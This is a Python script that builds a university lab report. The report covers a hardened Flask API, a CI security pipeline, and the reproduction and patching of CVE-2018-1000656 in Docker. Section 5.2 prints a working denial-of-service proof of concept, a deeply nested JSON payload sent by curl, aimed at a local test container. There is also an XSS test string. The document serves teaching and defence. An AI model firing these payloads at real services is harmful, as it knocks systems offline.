"""Generate the Lab1 Word report (English) with embedded CI screenshots."""
import os
from docx import Document
from docx.shared import Pt, Cm, Inches, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH

BASE = os.path.dirname(os.path.abspath(__file__))
ASSETS = os.path.join(BASE, "assets")

doc = Document()
style = doc.styles["Normal"]
style.font.name = "Times New Roman"
style.font.size = Pt(11)


def h1(t): doc.add_heading(t, level=1)
def h2(t): doc.add_heading(t, level=2)
def p(t):  doc.add_paragraph(t)

def shot(path, caption, width=Inches(6.0)):
    """Embed a screenshot with a centered caption."""
    full = os.path.join(ASSETS, path) if path else ""
    if path and os.path.exists(full):
        par = doc.add_paragraph()
        par.alignment = WD_ALIGN_PARAGRAPH.CENTER
        par.add_run().add_picture(full, width=width)
        cap = doc.add_paragraph()
        cap.alignment = WD_ALIGN_PARAGRAPH.CENTER
        r = cap.add_run(caption)
        r.italic = True
        r.font.size = Pt(9)
    else:
        ph = doc.add_paragraph()
        ph.alignment = WD_ALIGN_PARAGRAPH.CENTER
        run = ph.add_run(f"[Insert screenshot: {caption}]")
        run.bold = True
        run.font.color.rgb = RGBColor(0xC0, 0x00, 0x00)


# ---------------- Cover ----------------
t = doc.add_paragraph(); t.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = t.add_run("HDU Cybersecurity Lab Report")
r.bold = True; r.font.size = Pt(20)

sub = doc.add_paragraph(); sub.alignment = WD_ALIGN_PARAGRAPH.CENTER
sr = sub.add_run("Lab 1 — Secure REST API Development with CI/CD\nand Real CVE Vulnerability Analysis")
sr.bold = True; sr.font.size = Pt(14)

for _ in range(4): doc.add_paragraph()
for label in ["Lab No.        : Work 1",
              "Variant No.    : ____________",
              "Name           : ____________",
              "Student ID     : ____________",
              "Score          : ____________"]:
    par = doc.add_paragraph(); par.alignment = WD_ALIGN_PARAGRAPH.CENTER
    rr = par.add_run(label); rr.font.size = Pt(13)

doc.add_page_break()

# ---------------- 1. Objective ----------------
h1("1. Objective")
p("1. Design and implement a security-hardened RESTful backend API, addressing common OWASP Top 10 "
  "risks such as broken authentication, SQL injection and cross-site scripting.")
p("2. Integrate SAST (Static Application Security Testing) and SCA (Software Composition Analysis) "
  "into a CI/CD pipeline so that every push is automatically scanned.")
p("3. Reproduce a real CVE in a Vulhub/Docker environment and complete the full cycle: "
  "reproduction → root-cause analysis → patch → verification.")

# ---------------- 2. Environment ----------------
h1("2. Environment and Technology Stack")
tbl = doc.add_table(rows=6, cols=2); tbl.style = "Light Grid Accent 1"
rows = [
    ("OS", "Windows 11 / WSL2 (Docker Desktop)"),
    ("Backend", "Python 3.11+ / Flask 3.0"),
    ("Database", "SQLite 3 (parameterized queries)"),
    ("AuthN", "JWT (PyJWT, HS256, 30-min expiry)"),
    ("Password hashing", "bcrypt (cost factor = 12)"),
    ("CI/CD", "GitHub Actions: Bandit (SAST) + Safety (SCA)"),
]
for i, (k, v) in enumerate(rows):
    tbl.rows[i].cells[0].text = k
    tbl.rows[i].cells[1].text = v

# ---------------- 3. API ----------------
h1("3. Secure REST API Implementation")

h2("3.1 Endpoint Design")
p("POST /auth/login   — accepts username and password, returns a signed JWT on success.")
p("GET  /api/data     — protected route; requires a Bearer JWT, returns the caller's items.")
p("POST /api/create   — protected custom route; creates a new item, with user content HTML-escaped before storage.")

h2("3.2 Security Controls")
p("(1) SQL injection prevention: every SQLite query uses ? placeholders with bound parameters "
  "(e.g. SELECT ... WHERE username = ?); no string concatenation is used anywhere.")
p("(2) XSS prevention: all user-controlled strings pass through html.escape(quote=True) before "
  "being stored. Submitting <script>alert(1)</script> is persisted as &lt;script&gt;alert(1)&lt;/script&gt;.")
p("(3) Authentication: login issues an HS256 JWT with a 30-minute expiry. A @login_required decorator "
  "verifies signature and expiry on every protected route; missing/invalid tokens receive 401.")
p("(4) Password storage: passwords are salted-hashed with bcrypt at work factor 12; the database "
  "stores only the hash. A dummy bcrypt check is still run for unknown usernames to mitigate "
  "user-enumeration timing attacks.")

h2("3.3 Functional Test Results")
p("The following checks were executed with curl against the running service:")
p("  · GET /health                         → 200 {\"status\":\"ok\"}")
p("  · GET /api/data without token          → 401")
p("  · POST /auth/login with wrong password → 401")
p("  · POST /auth/login with valid creds   → 200 with JWT")
p("  · GET /api/data with token             → 200")
p("  · POST /api/create with XSS payload    → 201; content stored escaped")
shot("", "API functional test (curl output)")

# ---------------- 4. CI/CD ----------------
h1("4. CI/CD Security Pipeline")
p("A GitHub Actions workflow (.github/workflows/ci.yml) runs on every push and pull request to main.")
p("  · Bandit — SAST: statically scans app.py for dangerous calls, hardcoded secrets and unsafe patterns.")
p("  · Safety — SCA: scans requirements.txt against the CVE database for vulnerable third-party packages.")

shot("ci-actions-green.png", "Figure 1 — GitHub Actions workflow completed successfully (green check).")
shot("ci-bandit.png", "Figure 2 — Bandit SAST result: no issues identified (0 Low / 0 Medium / 0 High).")
shot("ci-safety.png", "Figure 3 — Safety SCA result: 3 packages scanned, dependency vulnerabilities reported.")

# ---------------- 5. CVE repro ----------------
h1("5. CVE-2018-1000656 — Reproduction")

h2("5.1 Vulnerability Summary")
tbl = doc.add_table(rows=5, cols=2); tbl.style = "Light Grid Accent 1"
cve = [
    ("CVE ID", "CVE-2018-1000656"),
    ("Affected product", "Pallets Project Flask < 0.12.3"),
    ("Fixed version", "Flask 0.12.3"),
    ("CWE", "CWE-20 Improper Input Validation"),
    ("Impact", "Unauthenticated remote Denial of Service (excessive memory consumption)"),
]
for i, (k, v) in enumerate(cve):
    tbl.rows[i].cells[0].text = k
    tbl.rows[i].cells[1].text = v

h2("5.2 Reproduction Steps")
p("(1) Build and start the vulnerable target (Flask 0.12.2) with Docker Compose:")
p("    docker compose -f docker-compose.vuln.yml up --build -d")
p("(2) Verify the target is up: curl http://127.0.0.1:8000/")
p("(3) Generate a pathologically nested JSON payload:")
p("    python -c \"print('[' * 5000 + '1' + ']' * 5000)\" > payload.json")
p("(4) Record the baseline memory with: docker stats --no-stream")
p("(5) Fire the attack:")
p("    curl -H \"Content-Type: application/json\" --data-binary @payload.json http://127.0.0.1:8000/json")
p("(6) Re-run docker stats; the container's memory spikes dramatically and the request hangs / returns 500.")
shot("", "Figure 4 — Memory baseline BEFORE attack (docker stats).")
shot("", "Figure 5 — Memory AFTER attack: memory exhausted (DoS).")

h2("5.3 Root-Cause Analysis")
p("Flask versions before 0.12.3 used an internal JSON request parser that did not bound the cost "
  "of malformed or deeply nested input. An unauthenticated remote attacker who POSTs such a body to "
  "any endpoint calling request.get_json() can force the web worker to allocate unbounded memory "
  "before it returns an error, eventually exhausting the process and causing a denial of service.")

# ---------------- 6. Fix ----------------
h1("6. Fix and Verification")

h2("6.1 Patch")
p("The single meaningful change is in vulhub-cve/Dockerfile.fixed:")
p("    - RUN pip install --no-cache-dir flask==0.12.2")
p("    + RUN pip install --no-cache-dir flask==0.12.3")
p("Version 0.12.3 bounds the JSON decoder's input handling so that malformed payloads are rejected "
  "quickly with HTTP 400, without unbounded memory allocation. For production we recommend upgrading to "
  "Flask >= 2.3, setting a container memory limit, and putting a reverse-proxy request-body size limit "
  "in front of the app.")

h2("6.2 Verification of the Fix")
p("Bring up the patched image and replay the same PoC:")
p("    docker compose -f docker-compose.vuln.yml down")
p("    docker compose -f docker-compose.fixed.yml up --build -d")
p("    curl -i -H \"Content-Type: application/json\" --data-binary @payload.json http://127.0.0.1:8000/json")
p("Expected: HTTP 400 returned in milliseconds, docker stats shows flat memory — the DoS is gone.")
shot("", "Figure 6 — After the fix, the same PoC is rejected with HTTP 400 and memory stays flat.")

h2("6.3 Regression Test")
p("Legitimate business functionality must still work:")
p("    curl -H \"Content-Type: application/json\" -d '{\"hello\":\"world\"}' http://127.0.0.1:8000/json")
p("Expected response: {\"echo\":{\"hello\":\"world\"}}")
shot("", "Figure 7 — Regression test: normal JSON echo endpoint still works.")

# ---------------- 7. Questions ----------------
h1("7. Answers to Control Questions")
qa = [
    ("Q1. Why is bcrypt preferable to SHA-256 for password hashing?",
     "bcrypt is an adaptive, salted, slow hash with a tunable work factor; SHA-256 is fast and "
     "unsalted, making offline brute-force and rainbow-table attacks trivial."),
    ("Q2. SAST vs DAST?",
     "SAST audits source code without running the app (white-box, e.g. Bandit); DAST attacks a "
     "running instance (black-box, e.g. OWASP ZAP)."),
    ("Q3. How does the server verify a JWT?",
     "It re-signs the header+payload with its own secret and compares the resulting signature with "
     "the one presented; it also validates exp/iat time claims."),
    ("Q4. Risk of not auditing dependencies?",
     "Transitive libraries may contain known CVEs that the application never wrote itself; "
     "SCA catches them before merge."),
    ("Q5. Why Docker/Vulhub instead of installing the vulnerable software locally?",
     "Isolated, reproducible, disposable environments; exact version pinning; no host pollution."),
    ("Q6. Vulnerability vs exploit?",
     "A vulnerability is the software flaw; an exploit is the request/code that triggers it. "
     "CVE-2018-1000656 is the vulnerability; the nested-JSON curl request is the exploit."),
    ("Q7. Why regression-test after a fix?",
     "To confirm the patch blocks the vulnerability without breaking legitimate functionality."),
    ("Q8. Value of reproducing known CVEs?",
     "It builds hands-on intuition for exploitation preconditions and patch behaviour, directly "
     "transferable to SOC triage and penetration testing."),
]
for q, a in qa:
    p(q)
    par = doc.add_paragraph(a); par.paragraph_format.left_indent = Cm(0.5)

# ---------------- 8. Summary ----------------
h1("8. Summary")
p("This lab implemented a secure Flask REST API (parameterized queries, output escaping, JWT "
  "authentication, bcrypt password hashing), wired SAST (Bandit) and SCA (Safety) into a GitHub "
  "Actions pipeline, and reproduced, analysed, patched and verified CVE-2018-1000656 (a Flask JSON "
  "decoder denial-of-service) in Docker. The full secure development lifecycle was demonstrated.")

out = os.path.join(BASE, "Lab1-Report.docx")
doc.save(out)
print("saved:", out)
